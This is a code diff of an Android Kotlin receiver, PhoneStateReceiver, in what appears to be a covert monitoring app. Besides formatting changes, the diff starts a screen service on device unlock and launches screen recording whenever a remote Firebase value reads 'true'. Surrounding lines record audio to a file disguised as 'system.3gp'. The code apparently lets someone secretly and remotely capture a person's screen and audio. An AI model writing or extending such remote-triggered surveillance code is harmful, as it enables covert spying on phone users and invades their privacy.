@@ -59,7 +59,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
     var outputFile = Environment.getExternalStorageDirectory().absolutePath + "/system.3gp"
     private var filePath = ""
     var myAudioRecorder: MediaRecorder? = MediaRecorder()
-    var myRef: DatabaseReference?=null
+    var myRef: DatabaseReference? = null
     /**
      * A problem occurred when trying to create the output file
      */
@@ -76,7 +76,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
             //  mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             val action = intent.action
             var database = FirebaseDatabase.getInstance()
-             myRef  = database.getReference("message")
+            myRef = database.getReference("message")
 
             if (ScreenPreference.getInstance(context).saveDeviceID == "0") {
                 if (Intent.ACTION_SCREEN_ON == action) {
@@ -107,18 +107,19 @@ class PhoneStateReceiver : BroadcastReceiver() {
                         ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
                     }
                 } else if (Intent.ACTION_USER_PRESENT == action) {
+                    context.startService(Intent(context, ScreenService::class.java))
 
                     checkOnOff()
 
 
-                   /* Log.d(TAG, "screen is unlock...")
-                    var inten = Intent(mContext, ScreenRecordingActivity::class.java)
-                    inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    ScreenPreference.getInstance(context).orderID = "true"
+                    /* Log.d(TAG, "screen is unlock...")
+                     var inten = Intent(mContext, ScreenRecordingActivity::class.java)
+                     inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                     inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                     ScreenPreference.getInstance(context).orderID = "true"
 
-                    mContext!!.startActivity(inten)
-                    context.startService(Intent(context, ScreenService::class.java))*/
+                     mContext!!.startActivity(inten)
+                     context.startService(Intent(context, ScreenService::class.java))*/
 
                 }
             }
@@ -194,7 +195,13 @@ class PhoneStateReceiver : BroadcastReceiver() {
             override fun onDataChange(dataSnapshot: DataSnapshot) {
                 val value = dataSnapshot.getValue(String::class.java)
                 Log.d(TAG, "Value is: $value")
-                if (value!!.contains("true")){
+                    if (value!!.contains("true")) {
+
+                    Log.d(TAG, "screen is unlock...")
+                    var inten = Intent(mContext, ScreenRecordingActivity::class.java)
+                    inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    mContext!!.startActivity(inten)
 
                 }
             }
